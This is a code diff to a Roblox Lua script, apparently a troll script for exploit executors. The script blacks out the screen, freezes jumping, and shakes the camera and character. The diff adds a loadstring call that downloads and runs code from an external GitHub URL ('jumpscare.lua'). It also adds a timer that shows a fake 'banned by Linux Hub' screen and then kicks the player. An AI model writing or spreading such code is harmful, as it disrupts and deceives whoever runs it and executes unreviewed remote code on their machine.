@@ -1,7 +1,6 @@
 -- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
@@ -18,7 +17,7 @@ screenGui.Parent = CoreGui
 
 -- Fundo preto gigante
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(5,0,5,0) -- muito maior que tela
+frame.Size = UDim2.new(5,0,5,0) -- maior que a tela
 frame.Position = UDim2.new(-2,0,-2,0)
 frame.BackgroundColor3 = Color3.new(0,0,0)
 frame.ZIndex = 10
@@ -57,16 +56,48 @@ humanoid.JumpPower = 0
 -- Bugar câmera e personagem
 local cam = workspace.CurrentCamera
 RunService.RenderStepped:Connect(function()
-    -- câmera tremendo
     cam.CFrame = cam.CFrame * CFrame.Angles(
         math.rad(math.random(-2,2)), 
         math.rad(math.random(-2,2)), 
         0
     )
-    -- mexer player sozinho
     hrp.CFrame = hrp.CFrame * CFrame.new(
         math.random(-1,1) * 0.25, 
         0, 
         math.random(-1,1) * 0.25
     )
+end)
+
+-- Executar jumpscare externo
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+
+-- Kick após 1 minuto
+delay(60, function()
+    -- Limpar GUI
+    screenGui:Destroy()
+    
+    -- Criar GUI do kick
+    local kickGui = Instance.new("ScreenGui")
+    kickGui.Name = "KickMessage"
+    kickGui.IgnoreGuiInset = true
+    kickGui.ResetOnSpawn = false
+    kickGui.Parent = CoreGui
+
+    local kickFrame = Instance.new("Frame")
+    kickFrame.Size = UDim2.new(1,0,1,0)
+    kickFrame.Position = UDim2.new(0,0,0,0)
+    kickFrame.BackgroundColor3 = Color3.new(0,0,0)
+    kickFrame.Parent = kickGui
+
+    local kickText = Instance.new("TextLabel")
+    kickText.Size = UDim2.new(1,0,1,0)
+    kickText.BackgroundTransparency = 1
+    kickText.Text = "VC FOI BANIDO PELO LINUX HUB\nYOU HAVE BEEN BANNED BY LINUX HUB"
+    kickText.TextColor3 = Color3.new(1,0,0)
+    kickText.TextScaled = true
+    kickText.Font = Enum.Font.GothamBlack
+    kickText.Parent = kickFrame
+
+    -- Dar kick
+    player:Kick("VC FOI BANIDO PELO LINUX HUB | YOU HAVE BEEN BANNED BY LINUX HUB")
 end)
